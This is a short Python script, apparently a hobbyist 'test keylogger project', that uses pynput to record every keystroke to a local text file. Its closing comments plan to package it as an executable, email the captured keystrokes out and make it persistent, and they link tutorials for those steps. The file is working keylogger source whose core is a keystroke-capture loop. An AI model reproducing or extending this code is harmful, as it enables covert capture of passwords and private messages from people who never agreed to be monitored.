#Experimenting with pynput for test keylogger project
from pynput import keyboard

currentWord = ""

def keyPressed(key):
    print(str(key))
    global currentWord 

    with open("keyfile.txt", 'a') as logKey:
        try:
            if key == keyboard.Key.space:
                print(currentWord)
                logKey.write(currentWord + " ")
                currentWord = ""
            elif key == keyboard.Key.enter:
                if currentWord == "":
                    logKey.write("\n")
                else:
                    logKey.write(currentWord + "\n")
            else:
                currentWord +=  key.char
        except:
            if key == keyboard.Key.backspace:
                logKey.write(str(key))
            else:
                logKey.write(str(key) + "\n")
            #print("error getting char")
            
    
if __name__ == "__main__":
    #when key is pressed call keyPressed function
    listener = keyboard.Listener(on_press=keyPressed)
    #start the listener
    listener.start()
    listener.join()

#Add: turn to exe, send to email, change Key.XXX to symbol matching
#add time stamps for when program is sending updates?
#https://thepythoncode.com/article/building-python-files-into-stand-alone-executables-using-pyinstaller
#https://thepythoncode.com/article/how-to-create-malware-persistent-in-python

